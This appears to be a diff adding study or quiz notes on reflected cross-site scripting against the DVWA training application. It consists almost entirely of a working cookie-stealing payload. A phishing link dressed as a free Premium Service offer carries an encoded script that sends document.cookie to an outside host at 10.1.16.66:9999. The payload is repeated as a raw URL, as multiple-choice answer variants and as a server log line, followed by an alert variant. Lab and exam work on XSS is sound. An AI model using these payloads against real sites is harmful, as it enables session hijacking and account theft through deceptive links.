@@ -1,0 +1,13 @@
+<A HREF="http://dvwa.structureality.com/vulnerabilities/xss_r/?name=%3cscript%3ewindow.location%3d%27http%3a%2f%2f10.1.16.66%3a9999%2f%3fcookie%3d%27%2bdocument.cookie%3c%2fscript%3e">Activate your 6-months of free Premium Service!</a>
+
+http://dvwa.structureality.com/vulnerabilities/xss_r/?name=%3cscript%3ewindow.location%3d%27http%3a%2f%2f10.1.16.66%3a9999%2f%3fcookie%3d%27%2bdocument.cookie%3c%2fscript%3e
+
+A. http://dvwa.structureality.com/vulnerabilities/xss_r/?name=%3cscript%3ewindow.location%3d%27http%3a%2f%2f10.1.16.66%3a9999%2f%3fcookie%3d%27%2bdocument.cookie%3c%2fscript%3e    
+B. http://dvwa.structureality.com/vulnerabilities/xss_r/?name=<script>window.location='http://10.1.16.66:9999/?cookie='+document.cookie</script>
+C. http://dvwa.structureality.com/vulnerabilities/xss_r/?name=
+D. http://dvwa.structureality.com/vulnerabilities/xss_r/?name=<script>window.location%3d%27http%3a%2f%2f10.1.16.66%3a9999%2f%3falert%3d%27%2bdocument.cookie</script>
+
+"GET /vulnerabilities/xss_r/?name=%3cscript%3ewindow.location%3d%27http%3a%2f%2f10.1.16.66%3a9999%2f%3fcookie%3d%27%2bdocument.cookie%3c%2fscript%3e HTTP/1.1"
+
+"dvwa.structurealty.com/vulnerabilities/xss_r/?name=%3cscript%3ealert%28%22You+have+been+hacked%21+Again%21%22%29%3c%2fscript%3e HTTP/1.1"
+
